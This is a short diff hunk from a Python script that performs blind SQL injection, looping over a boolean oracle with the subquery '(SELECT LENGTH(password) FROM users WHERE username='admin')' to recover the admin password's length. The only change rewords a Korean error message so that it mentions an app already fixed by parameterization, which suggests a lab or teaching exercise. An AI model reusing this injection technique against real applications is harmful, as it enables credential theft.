@@ -24,7 +24,7 @@ def query_length() -> int:
     while not is_true(f"(SELECT LENGTH(password) FROM users WHERE username='admin')={n}"):
         n += 1
         if n > 64:
-            raise RuntimeError("길이를 찾지 못했다. 앱이 떠 있는지 확인하라.")
+            raise RuntimeError("길이를 찾지 못했다. 앱이 떠 있는지, 또는 이미 파라미터화로 고쳐진 앱인지 확인하라.")
     return n
 
 
